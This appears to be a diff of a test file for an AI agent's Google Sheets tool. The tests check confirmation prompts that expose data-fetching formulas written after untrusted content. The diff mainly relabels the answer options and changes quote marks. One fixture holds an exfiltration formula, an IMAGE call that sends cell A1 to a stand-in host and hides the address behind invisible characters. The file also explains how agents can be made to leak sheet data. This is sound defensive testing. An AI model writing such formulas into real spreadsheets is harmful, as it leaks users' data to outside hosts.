@@ -60,7 +60,7 @@ const APPENDED = { ok: true, json: async () => ({ updates: { updatedRange: 'Shee
 /** Said wherever a question shows a formula: the functions are examples, and the address may be built. */
 const FETCHES = 'A formula can make Google fetch an address and send data from the sheet with it. IMPORTXML, IMPORTHTML, IMPORTDATA, IMPORTFEED, IMPORTRANGE and IMAGE are examples; other functions can do it too. The address need not be written out: a formula can build it from other cells.';
 const HIDDEN = 'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.';
-const PLAIN_WRITE_QUESTION = 'Overwrite range "Sheet1!B2:C3" in spreadsheet sid? This will replace existing data.';
+const PLAIN_WRITE_QUESTION = 'Overwrite range “Sheet1!B2:C3” in spreadsheet sid? This will replace existing data.';
 
 describe('a cell that starts like a formula', () => {
   it.each([
@@ -176,20 +176,20 @@ describe('google_sheets after content from outside the chat', () => {
   });
 
   it('asks as always, and writes the formulas as given, before any content from outside', async () => {
-    const a = agent('none', 'Yes');
+    const a = agent('none', 'confirm');
     mockFetch.mockResolvedValueOnce(WRITTEN);
     await createSheetsTool(auth).handler(write, a);
-    expect(asked(a).options).toEqual(['Yes', 'No']);
+    expect(asked(a).options).toEqual(['confirm', 'cancel']);
     expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
     expect(sentValues()).toEqual(write.values);
     expect(sentUrl()).toContain('valueInputOption=USER_ENTERED');
   });
 
   it('asks as always when no cell starts like a formula', async () => {
-    const a = agent('sawUntrustedData', 'Yes');
+    const a = agent('sawUntrustedData', 'confirm');
     mockFetch.mockResolvedValueOnce(WRITTEN);
     await createSheetsTool(auth).handler({ ...write, values: [['Name', '-5'], ['Alice', 'Bob']] }, a);
-    expect(asked(a).options).toEqual(['Yes', 'No']);
+    expect(asked(a).options).toEqual(['confirm', 'cancel']);
     expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
   });
 
@@ -252,17 +252,17 @@ describe('google_sheets after content from outside the chat', () => {
     const result = await createSheetsTool(auth).handler({ action: 'append', spreadsheet_id: 'sid', range: 'Sheet1!A:B', values: [['x', FETCHING]] }, a);
     expect(result).toContain('Data appended');
     expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
-    expect(flattenPrompt(asked(a).prompt).split('\n')[0]).toBe('Add rows to range "Sheet1!A:B" in spreadsheet sid? Nothing is overwritten.');
+    expect(flattenPrompt(asked(a).prompt).split('\n')[0]).toBe('Add rows to range “Sheet1!A:B” in spreadsheet sid? Nothing is overwritten.');
     expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`1st new row, 2nd value: ${FETCHING}`);
     expect(sentValues()).toEqual([['x', `'${FETCHING}`]]);
   });
 
   it('asks an append as adding rows, not as overwriting, before any content from outside', async () => {
-    const a = agent('none', 'Yes');
+    const a = agent('none', 'confirm');
     mockFetch.mockResolvedValueOnce(APPENDED);
     await createSheetsTool(auth).handler({ action: 'append', spreadsheet_id: 'sid', range: 'Sheet1!A:B', values: [['x', FETCHING]] }, a);
-    expect(asked(a).options).toEqual(['Yes', 'No']);
-    expect(flattenPrompt(asked(a).prompt)).toBe('Add rows to range "Sheet1!A:B" in spreadsheet sid? Nothing is overwritten.');
+    expect(asked(a).options).toEqual(['confirm', 'cancel']);
+    expect(flattenPrompt(asked(a).prompt)).toBe('Add rows to range “Sheet1!A:B” in spreadsheet sid? Nothing is overwritten.');
     expect(sentUrl()).toContain('insertDataOption=INSERT_ROWS');
   });
 
@@ -284,9 +284,9 @@ describe('google_sheets format after content from outside the chat', () => {
   }
 
   it('shows a request that writes a formula in full, with its range and content', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
-    expect(asked(a).options).toEqual(['Yes', 'No']);
+    expect(asked(a).options).toEqual(['confirm', 'cancel']);
     expect(flattenPrompt(asked(a).prompt)).toBe([PLAIN_FORMAT_QUESTION, '', NOTE_ONE, `updateCells: ${JSON.stringify(FORMULA_CELLS.updateCells)}`].join('\n'));
     // The request is a value, set apart from the question's own words.
     const values = promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text);
@@ -295,7 +295,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('asks the whole batch when a pure formatting request comes with one that writes cells, and sends nothing on no', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     const result = await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, a);
     expect(result).toBe('Action cancelled by user.');
     expect(mockFetch).not.toHaveBeenCalled();
@@ -306,19 +306,19 @@ describe('google_sheets format after content from outside the chat', () => {
 
   it('sends every request of the batch as given when the owner says yes', async () => {
     mockFetch.mockResolvedValueOnce(APPLIED);
-    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, agent('sawUntrustedData', 'Yes'));
+    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [BORDERS, FORMULA_CELLS] }, agent('sawUntrustedData', 'confirm'));
     expect(sentRequests()).toEqual([BORDERS, FORMULA_CELLS]);
   });
 
   it('shows a request type it does not know, as one that may write cells', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     const made = { setSomethingNew: { range: RANGE, value: FETCHING } };
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [made] }, a);
     expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`setSomethingNew: ${JSON.stringify(made.setSomethingNew)}`);
   });
 
   it('counts the requests it shows, and keeps each on one line', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     const paste = { pasteData: { coordinate: { sheetId: 0 }, data: `a,${FETCHING}\nB1: harmless`, delimiter: ',' } };
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [paste, FORMULA_CELLS, 'odd'] }, a);
     const lines = flattenPrompt(asked(a).prompt).split('\n');
@@ -338,7 +338,7 @@ describe('google_sheets format after content from outside the chat', () => {
     ['two types in one request', { updateBorders: { range: RANGE }, updateCells: FORMULA_CELLS.updateCells }],
     ['a condition rule', { addConditionalFormatRule: { rule: { ranges: [RANGE], booleanRule: { condition: { type: 'CUSTOM_FORMULA', values: [{ userEnteredValue: FETCHING }] } } } } }],
   ])('shows a repeatCell or request with %s', async (_label, request) => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
     expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
   });
@@ -352,10 +352,10 @@ describe('google_sheets format after content from outside the chat', () => {
     ['a grouped format mask', [{ repeatCell: { range: RANGE, cell: { userEnteredFormat: {} }, fields: 'userEnteredFormat(backgroundColor,textFormat(bold,italic)), userEnteredFormat.wrapStrategy' } }]],
     ['merges, sizes and bands', [{ mergeCells: { range: RANGE, mergeType: 'MERGE_ALL' } }, { unmergeCells: { range: RANGE } }, { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 30 }, fields: 'pixelSize' } }, { autoResizeDimensions: { dimensions: { sheetId: 0, dimension: 'COLUMNS' } } }, { addBanding: { bandedRange: { range: RANGE } } }, { updateBanding: { bandedRange: { bandedRangeId: 1 }, fields: 'rowProperties' } }, { deleteBanding: { bandedRangeId: 1 } }]],
   ])('asks as always for %s', async (_label, requests) => {
-    const a = agent('sawUntrustedData', 'Yes');
+    const a = agent('sawUntrustedData', 'confirm');
     mockFetch.mockResolvedValueOnce(APPLIED);
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: requests }, a);
-    expect(asked(a).options).toEqual(['Yes', 'No']);
+    expect(asked(a).options).toEqual(['confirm', 'cancel']);
     expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_FORMAT_QUESTION);
     expect(sentRequests()).toEqual(requests);
   });
@@ -381,7 +381,7 @@ describe('google_sheets format after content from outside the chat', () => {
     ['rows hidden', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { hiddenByUser: true }, fields: 'hiddenByUser' } }],
     ['rows hidden beside a size', { updateDimensionProperties: { range: { sheetId: 0, dimension: 'ROWS' }, properties: { pixelSize: 3, hiddenByUser: true }, fields: 'pixelSize' } }],
   ])('shows a request with %s', async (_label, request) => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
     expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
   });
@@ -394,7 +394,7 @@ describe('google_sheets format after content from outside the chat', () => {
   }
 
   it('asks with a request whose line is exactly the longest a question shows', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [cellsOfLine(FORMAT_LINE_MAX)] }, a);
     expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toHaveLength(FORMAT_LINE_MAX);
   });
@@ -409,7 +409,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('counts a line by its characters as shown, not by UTF-16 units', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     const wide = String.fromCodePoint(0x1f600);
     const request = cellsOfLine(FORMAT_LINE_MAX - 10, wide.repeat(10)) as { updateCells: unknown };
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [request] }, a);
@@ -427,7 +427,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('asks with as many requests that write cells as a question shows', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: Array.from({ length: FORMAT_REQUESTS_SHOWN }, () => FORMULA_CELLS) }, a);
     expect(flattenPrompt(asked(a).prompt)).toContain(`${FORMAT_REQUESTS_SHOWN} of these requests can write cell content`);
   });
@@ -441,7 +441,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('writes an unseen character in a cell value as its escape, and sends the value as given', async () => {
-    const a = agent('sawUntrustedData', 'Yes');
+    const a = agent('sawUntrustedData', 'confirm');
     mockFetch.mockResolvedValueOnce(APPLIED);
     const hidden = { updateCells: { range: RANGE, rows: [{ values: [{ userEnteredValue: { formulaValue: '=IMAGE("https://ok.example/\u202e?d="&A1)\u200b\u00a0' } }] }], fields: 'userEnteredValue' } };
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [hidden] }, a);
@@ -453,7 +453,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('writes a line break and a direction character in a type name as escapes, so the name cannot draw a line', async () => {
-    const a = agent('sawUntrustedData', 'No');
+    const a = agent('sawUntrustedData', 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [{ 'x\nupdateBorders\u202e': {} }] }, a);
     const lines = flattenPrompt(asked(a).prompt).split('\n');
     expect(lines.at(-1)).toBe('x\\u000aupdateBorders\\u202e: {}');
@@ -469,7 +469,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it('asks as always, before any content from outside, even for a request that writes a formula', async () => {
-    const a = agent('none', 'Yes');
+    const a = agent('none', 'confirm');
     mockFetch.mockResolvedValueOnce(APPLIED);
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
     expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_FORMAT_QUESTION);
@@ -477,7 +477,7 @@ describe('google_sheets format after content from outside the chat', () => {
   });
 
   it.each(['sawExternalContentTool', 'conversationSawUntrusted'] as const)('counts content from outside by %s as well', async (taint) => {
-    const a = agent(taint, 'No');
+    const a = agent(taint, 'cancel');
     await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [FORMULA_CELLS] }, a);
     expect(flattenPrompt(asked(a).prompt)).toContain(NOTE_ONE);
   });
